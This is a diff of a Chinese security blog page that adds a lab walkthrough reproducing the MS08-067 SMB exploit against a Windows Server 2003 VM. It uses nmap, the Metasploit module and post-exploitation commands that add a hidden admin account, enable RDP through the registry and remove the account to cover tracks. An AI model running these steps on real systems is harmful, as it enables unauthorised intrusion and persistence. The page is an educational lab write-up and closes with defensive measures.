@@ -21,18 +21,40 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"default"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":{"gitalk":{"order":-2}},"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":false,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"content.json"};
   </script>
 
-  <meta name="description" content="v5le0n9&#39;s garden">
+  <meta name="description" content="1. 漏洞背景1.1 漏洞概述MS08-067漏洞全称是“Windows Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的SMB服务端口445，发送特殊RPC(Remote Procedure Call，远程过程调用)请求，造成栈缓冲区内存错误，从而被利用实施远程代码执行。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="MS08-067漏洞复现及防御机制">
 <meta property="og:url" content="http://example.com/posts/fa648f2b.html">
 <meta property="og:site_name" content="v5le0n9&#39;s garden">
-<meta property="og:description" content="v5le0n9&#39;s garden">
+<meta property="og:description" content="1. 漏洞背景1.1 漏洞概述MS08-067漏洞全称是“Windows Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的SMB服务端口445，发送特殊RPC(Remote Procedure Call，远程过程调用)请求，造成栈缓冲区内存错误，从而被利用实施远程代码执行。">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/2.1.1.jpg">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/2.2.1.png">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/2.2.2.png">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/3.3.1.png">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/3.3.2.png">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/3.3.3.png">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/3.3.4.png">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/3.3.7.png">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/3.3.5.png">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/3.3.9.png">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/3.3.10.png">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/3.3.16.png">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/3.3.17.png">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/3.3.18.png">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/3.3.6.png">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/3.3.8.png">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/3.3.11.png">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/3.3.13.png">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/3.3.12.png">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/3.3.15.png">
+<meta property="og:image" content="http://example.com/posts/fa648f2b/3.3.14.png">
 <meta property="article:published_time" content="2022-05-25T01:02:44.954Z">
-<meta property="article:modified_time" content="2022-05-25T01:03:33.121Z">
+<meta property="article:modified_time" content="2022-05-27T13:59:01.315Z">
 <meta property="article:author" content="v5le0n9">
 <meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/posts/fa648f2b/2.1.1.jpg">
 
 <link rel="canonical" href="http://example.com/posts/fa648f2b.html">
 
@@ -213,10 +235,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-05-25 09:02:44 / 修改时间：09:03:33" itemprop="dateCreated datePublished" datetime="2022-05-25T09:02:44+08:00">2022-05-25</time>
+              <time title="创建时间：2022-05-25 09:02:44" itemprop="dateCreated datePublished" datetime="2022-05-25T09:02:44+08:00">2022-05-25</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-27 21:59:01" itemprop="dateModified" datetime="2022-05-27T21:59:01+08:00">2022-05-27</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -240,14 +268,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>0</span>
+              <span>3.5k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>3 分钟</span>
             </span>
 
         </div>
@@ -259,7 +287,102 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        
+        <h1 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1. 漏洞背景"></a>1. 漏洞背景</h1><h2 id="1-1-漏洞概述"><a href="#1-1-漏洞概述" class="headerlink" title="1.1 漏洞概述"></a>1.1 漏洞概述</h2><p>MS08-067漏洞全称是“Windows Server服务RPC请求缓冲区溢出漏洞”，攻击者利用受害者主机默认开放的SMB服务端口445，发送特殊RPC(Remote Procedure Call，远程过程调用)请求，造成栈缓冲区内存错误，从而被利用实施远程代码执行。</p>
+<span id="more"></span>
+<p>当用户在受影响的系统上收到RPC请求时，该漏洞会允许远程执行代码，攻击者可以在未经身份验证情况下利用此漏洞运行任意代码。同时，该漏洞可以用于蠕虫攻击。</p>
+<h2 id="1-2-漏洞原理"><a href="#1-2-漏洞原理" class="headerlink" title="1.2 漏洞原理"></a>1.2 漏洞原理</h2><p>MS08-067漏洞是通过MSRPC over SMB通道调用Server程序中的<code>NetPathCanonicalize()</code>函数时触发的。<code>NetPathCanonicalize()</code>函数在远程访问其它主机时，会调用<code>NetpwPathCanonicalize()</code>函数，对远程访问的路径进行规范化，而在<code>NetpwPathCanonicalize()</code>函数中发生了栈缓冲区内存错误（溢出），造成可被利用实施远程代码执行（Remote Code Execution）。</p>
+<p>所谓路径规范化，就是将路径字符串中的【/】转换为【\】，同时去除相对路径【.\】和【..\】。</p>
+<p>在路径规范化的操作中，服务程序对路径字符串的地址空间检查存在逻辑漏洞。攻击者通过精心设计输入路径，可以在函数去除【…\】字符串时，把路径字符串中内容复制到路径串之前的地址空间中（低地址），达到覆盖函数返回地址，执行任意代码的目的。</p>
+<p>详细请看：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/justforfun12/p/5239941.html">https://www.cnblogs.com/justforfun12/p/5239941.html</a> </p>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-251219.htm">https://bbs.pediy.com/thread-251219.htm</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/203881.html">https://www.freebuf.com/vuls/203881.html</a></p>
+<h2 id="1-3-影响范围"><a href="#1-3-影响范围" class="headerlink" title="1.3 影响范围"></a>1.3 影响范围</h2><p>它影响了某些旧版本的Windows系统，包括：Windows 2000 、Windows XP 、Windows Server 2003。</p>
+<h1 id="2-前置知识"><a href="#2-前置知识" class="headerlink" title="2. 前置知识"></a>2. 前置知识</h1><h2 id="2-1-常见的端口"><a href="#2-1-常见的端口" class="headerlink" title="2.1 常见的端口"></a>2.1 常见的端口</h2><img src="/posts/fa648f2b/2.1.1.jpg" class="" title="常见的端口">
+<p>黑客通过端口可以做信息收集、目标探测、服务判断、系统判断、角色分析。</p>
+<h2 id="2-2-445端口"><a href="#2-2-445端口" class="headerlink" title="2.2 445端口"></a>2.2 445端口</h2><p>135、137、138、139和445端口都是与文件共享和打印机共享有关的端口，而且在这几个端口上经常爆发很严重的漏洞。比如2017年危害全球的永恒之蓝，就是利用的445端口。</p>
+<p>445端口就是利用SMB（Server Message Block）Windows协议族，用于文件共享、打印共享的服务。445端口是一个毁誉参半的端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机，但也正是因为有了它，黑客们才有了可乘之机，他们能通过该端口偷偷共享你的硬盘，甚至会在悄无声息中将你的硬盘格式化掉！</p>
+<p>总之，公开服务器打开139和445端口是一件非常危险的事情。 如果有Guest 帐号，而且没有设置任何密码时，就能够被人通过因特网轻松地盗看文件。如果给该帐号设置了写入权限，甚至可以轻松地篡改文件。也就是说在对外部公开的服务器中不应该打开这些端口。通过因特网使用文件服务器就等同自杀行为，因此一定要关闭139和445端口。对于利用ADSL永久性接入因特网的客户端机器可以说也是如此。</p>
+<h1 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h1><h2 id="3-1-环境配置"><a href="#3-1-环境配置" class="headerlink" title="3.1 环境配置"></a>3.1 环境配置</h2><p>攻击机：Kali Linux x64（IP地址：192.168.193.128）</p>
+<p>靶机：Windows Server 2003  x86 企业版（IP地址：192.168.193.132）</p>
+<p>利用工具：MSF</p>
+<h2 id="3-2-复现准备"><a href="#3-2-复现准备" class="headerlink" title="3.2 复现准备"></a>3.2 复现准备</h2><p>打开Windows Server 2003，确定445端口开启：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an</span><br></pre></td></tr></table></figure>
+<img src="/posts/fa648f2b/2.2.1.png" class="" title="查看是否开启445端口">
+<p>关闭Win 2003系统的防火墙：</p>
+<img src="/posts/fa648f2b/2.2.2.png" class="" title="关闭系统防火墙">
+<h2 id="3-3-复现过程"><a href="#3-3-复现过程" class="headerlink" title="3.3 复现过程"></a>3.3 复现过程</h2><p>利用nmap扫描靶机的端口及确认该漏洞是否存在。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -n -p 445 --script smb-vuln-ms08-067 192.168.193.132 --open</span><br></pre></td></tr></table></figure>
+<ul>
+<li>-n：不要进行DNS解析</li>
+<li>-p：后接端口号</li>
+<li>—script：使用脚本进行扫描</li>
+<li>—open：仅显示打开（或可能打开）的端口</li>
+</ul>
+<p>nmap漏扫脚本目录默认为“/usr/share/nmap/script/”，如下图所示，扫描结果为VULNERABLE，表示漏洞存在且可以利用。</p>
+<img src="/posts/fa648f2b/3.3.1.png" class="" title="扫描目标靶机的端口及确认该漏洞是否存在">
+<p>当然，我们一开始肯定不知道这么多信息，还不会用这么长的命令，那我们可以先确定靶机开放的端口和版本号。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -Pn 192.168.193.132</span><br></pre></td></tr></table></figure>
+<ul>
+<li>-sV：探测打开的端口以确定服务/版本信息</li>
+<li>-Pn：将所有主机视为在线，也就是跳过主机发现</li>
+</ul>
+<img src="/posts/fa648f2b/3.3.2.png" class="" title="探测打开的端口以确定服务&#x2F;版本信息">
+<p>做安全行业的，一看到XP或2003系统的445端口开放，我们就能想到轰动一时的MS08-067。要是实在不知道，那我们还可以查百度嘛。</p>
+<p>进入MSF，搜索MS08-067，这些步骤都在 <a target="_blank" rel="noopener" href="https://v5le0n9.github.io/posts/2d03ac3f.html">CVE-2019-0708</a> 都讲过，不再赘述。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search ms08-067</span><br></pre></td></tr></table></figure>
+<img src="/posts/fa648f2b/3.3.3.png" class="" title="搜索MS08-067">
+<p>查找到一个漏洞利用模块。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms08_067_netapi</span><br><span class="line">show options</span><br><span class="line">show targets</span><br></pre></td></tr></table></figure>
+<p>查看选项，缺少rhosts，所以要设置靶机IP。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set rhosts 192.168.193.132 </span><br></pre></td></tr></table></figure>
+<img src="/posts/fa648f2b/3.3.4.png" class="" title="设置靶机IP">
+<p>查看目标，找到与靶机匹配的信息。刚才我们已经用nmap -sV知道靶机是Windows Server 2003系统，但还是不知道具体信息（<strong>所以这种情况怎么才能知道具体信息？</strong>）。由于我知道靶机是Win 2003 SP2的，所以直接选目标74，如果实在没有更多信息那设置为自动目标(0)就好。</p>
+<img src="/posts/fa648f2b/3.3.7.png" class="" title="设置target">
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set target 74</span><br><span class="line">run/exploit</span><br></pre></td></tr></table></figure>
+<img src="/posts/fa648f2b/3.3.5.png" class="" title="成功提权">
+<p>成功控制住靶机。我们可以用Linux或Windows窗口命令查看靶机的基本信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/ifconfig	#查看IP地址</span><br><span class="line">pwd					#查看当前所在位置</span><br><span class="line">sysinfo				#查看操作系统信息</span><br></pre></td></tr></table></figure>
+<img src="/posts/fa648f2b/3.3.9.png" class="" title="成功提权">
+<img src="/posts/fa648f2b/3.3.10.png" class="" title="成功提权">
+<p>后来做了set target 0的实验，MSF会自动检测系统版本并选择目标，但它默认选择English版本，这可能是没有成功建立会话的原因之一。</p>
+<img src="/posts/fa648f2b/3.3.16.png" class="" title="提权失败">
+<p>此时将它修改为74也不行了，提示我们“这很可能意味着先前的攻击尝试导致服务崩溃”。</p>
+<img src="/posts/fa648f2b/3.3.17.png" class="" title="提权失败">
+<p>如果多run几次还会导致Win 2003系统内存溢出错误。</p>
+<img src="/posts/fa648f2b/3.3.18.png" class="" title="内存溢出错误">
+<p>这种情况好像只能等靶机重新开机，才能利用前几次攻击失败的经验继续渗透。</p>
+<h3 id="3-3-1-创建文件"><a href="#3-3-1-创建文件" class="headerlink" title="3.3.1 创建文件"></a>3.3.1 创建文件</h3><p>尝试在靶机上创建文件夹和文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir hacker</span><br><span class="line">cd hacker</span><br><span class="line">shell		#进入靶机命令窗口</span><br><span class="line">echo v5le0n9&gt;test.txt</span><br></pre></td></tr></table></figure>
+<img src="/posts/fa648f2b/3.3.6.png" class="" title="在靶机创建目录">
+<img src="/posts/fa648f2b/3.3.8.png" class="" title="在靶机创建目录">
+<h3 id="3-3-2-创建用户"><a href="#3-3-2-创建用户" class="headerlink" title="3.3.2 创建用户"></a>3.3.2 创建用户</h3><p>Windows DOM用户常用命令如下：</p>
+<ul>
+<li><strong>net user abcd 1234 /add</strong><br>新建一个用户名为abcd，密码为1234的帐户，默认为user组成员</li>
+<li><strong>net user abcd /del</strong><br>将用户名为abcd的用户删除</li>
+<li><strong>net user abcd /active:no</strong><br>将用户名为abcd的用户禁用</li>
+<li><strong>net user abcd /active:yes</strong><br>激活用户名为abcd的用户</li>
+<li><strong>net user abcd</strong><br>查看用户名为abcd的用户的情况</li>
+<li><strong>net localgroup administrators abcd /add</strong><br>将abcd账户给予管理员权限</li>
+</ul>
+<p>创建一个名为v5le0n9，密码为123456的普通用户，给予管理员权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user v5le0n9 123456 /add	#增加普通用户</span><br><span class="line">net localgroup administrators v5le0n9 /add	#提升管理员权限</span><br></pre></td></tr></table></figure>
+<img src="/posts/fa648f2b/3.3.11.png" class="" title="提升管理员权限">
+<p>在Win 2003中能看到新创建了一个用户v5le0n9。</p>
+<img src="/posts/fa648f2b/3.3.13.png" class="" title="提升管理员权限">
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f &gt; C:\WINDOWS\system32\3389.bat &amp;&amp; call 3389.bat	# 开启远程连接</span><br><span class="line">netstat -an	# 查看网络端口</span><br><span class="line">rdesktop 192.168.193.132	# 远程连接</span><br></pre></td></tr></table></figure>
+<p>开启远程连接3389端口，使用Kali远程登录靶机。</p>
+<img src="/posts/fa648f2b/3.3.12.png" class="" title="开启远程连接3389端口">
+<p>最后一定要把我们新建的用户名删除，假装没来过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user v5le0n9 /del</span><br></pre></td></tr></table></figure>
+<p>虽然不能远程登录了，但靶机<code>C:\Documents and Settings</code>目录下还是有v5le0n9文件夹，<strong>怎么删不掉呢？！</strong></p>
+<img src="/posts/fa648f2b/3.3.15.png" class="" title="删除用户名">
+<img src="/posts/fa648f2b/3.3.14.png" class="" title="删除用户名">
+<h1 id="4-防御方法"><a href="#4-防御方法" class="headerlink" title="4. 防御方法"></a>4. 防御方法</h1><ul>
+<li>关闭相关端口、安装杀毒软件和补丁</li>
+<li>在防火墙中进行流量监测，主要是针对数据包中存在的形如“\ <em>* \ … \ … \ </em>”这样的恶意路径名进行检测，最为保险的方法是使用pcre正则去匹配</li>
+</ul>
+
     </div>
 
     
@@ -361,6 +484,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="nav-text">1. 漏洞背景</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-text">1.1 漏洞概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">1.2 漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-3-%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="nav-text">1.3 影响范围</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-text">2. 前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3"><span class="nav-text">2.1 常见的端口</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-445%E7%AB%AF%E5%8F%A3"><span class="nav-text">2.2 445端口</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">3. 漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="nav-text">3.1 环境配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-%E5%A4%8D%E7%8E%B0%E5%87%86%E5%A4%87"><span class="nav-text">3.2 复现准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-3-%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="nav-text">3.3 复现过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-1-%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6"><span class="nav-text">3.3.1 创建文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-2-%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7"><span class="nav-text">3.3.2 创建用户</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="nav-text">4. 防御方法</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -440,12 +564,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">916k</span>
+    <span title="站点总字数">920k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">13:53</span>
+    <span title="站点阅读时长">13:56</span>
 </div>
 
         
